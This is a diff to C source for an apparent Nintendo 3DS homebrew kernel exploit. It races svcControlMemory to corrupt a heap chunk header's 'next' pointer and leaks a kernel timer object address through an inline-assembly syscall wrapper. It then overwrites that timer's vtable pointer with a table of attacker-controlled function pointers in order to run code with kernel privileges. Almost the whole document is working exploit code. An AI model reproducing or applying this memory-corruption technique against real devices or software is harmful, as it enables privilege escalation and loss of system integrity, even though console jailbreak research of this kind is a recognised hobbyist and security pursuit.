@@ -2,6 +2,7 @@
 
 #include <stdio.h>
 #include <stdlib.h>
+#include <malloc.h>
 
 #define SLAB_HEAP ((void*) 0xFFF70000)
 #define PAGE_SIZE 0x1000
@@ -17,8 +18,31 @@ extern u32 __ctru_heap_size;
 
 static volatile Result control_res = -1;
 
+static void hello() {
+    printf("Hello world!\n");
+}
+
+static void* vtable[16] = {
+        hello,
+        hello,
+        hello,
+        hello,
+        hello,
+        hello,
+        hello,
+        hello,
+        hello,
+        hello,
+        hello,
+        hello,
+        hello,
+        hello,
+        hello,
+        hello
+};
+
 // Thread function to slow down svcControlMemory execution.
-void delay_thread(void* arg) {
+static void delay_thread(void* arg) {
     // Slow down thread execution until the control operation has completed.
     while(control_res == -1) {
         svcSleepThread(10000);
@@ -26,7 +50,7 @@ void delay_thread(void* arg) {
 }
 
 // Thread function to allocate memory pages.
-void allocate_thread(void* arg) {
+static void allocate_thread(void* arg) {
     u32* memInfo = (u32*) arg;
     if(memInfo == NULL) {
         // Don't try to use invalid memory information.
@@ -42,7 +66,7 @@ void allocate_thread(void* arg) {
 }
 
 // Maps pages with chunk headers present.
-void map_raw_pages(u32 memAddr, u32 memSize) {
+static void map_raw_pages(u32 memAddr, u32 memSize) {
     // Reset control result.
     control_res = -1;
 
@@ -63,14 +87,34 @@ void map_raw_pages(u32 memAddr, u32 memSize) {
     while((u32) svcArbitrateAddress(arbiter, memAddr, ARBITRATION_WAIT_IF_LESS_THAN, 0, 0) == 0xD9001814);
 }
 
-void wait_map_complete() {
+static void wait_map_complete() {
     while(control_res == -1) {
         svcSleepThread(1000000);
     }
 }
 
+static Result __attribute__((naked)) svcCreateTimerKAddr(Handle* timer, u8 reset_type, u32* kaddr) {
+    asm volatile(
+    "str r0, [sp, #-4]!\n"
+    "str r2, [sp, #-4]!\n"
+    "svc 0x1A\n"
+    "ldr r3, [sp], #4\n"
+    "str r2, [r3]\n"
+    "ldr r2, [sp], #4\n"
+    "str r1, [r2]\n"
+    "bx lr"
+    );
+}
+
 // Executes exploit.
 void do_hax() {
+    Handle timer;
+    u32 timerAddr;
+    svcCreateTimerKAddr(&timer, 0, &timerAddr);
+    svcSetTimer(timer, 0, 0);
+
+    printf("Timer address: %08X\n", (int) timerAddr);
+
     // Allow threads on core 1.
     aptOpenSession();
     APT_SetAppCpuTimeLimit(30);
@@ -87,7 +131,7 @@ void do_hax() {
     MemChunkHdr hdr = *(volatile MemChunkHdr*) memAddr;
 
     // Overwrite the header "next" pointer.
-    ((MemChunkHdr*) memAddr)->next = SLAB_HEAP; // TODO: destination
+    ((MemChunkHdr*) memAddr)->next = (void*) (timerAddr + 0x20);
 
     // Output debug information.
     printf("\"Size\" value: %08X\n", (int) hdr.size);
@@ -98,6 +142,12 @@ void do_hax() {
     wait_map_complete();
 
     printf("Final control result: %08X\n", (int) control_res);
+
+    void*** vtablePtr = (void***) (memAddr + (timerAddr - (timerAddr & ~0xFFF)) - 4);
+    *vtablePtr = vtable;
+
+    // Free the timer.
+    svcCloseHandle(timer);
 
     // Free the allocated pages.
     u32 tmp;
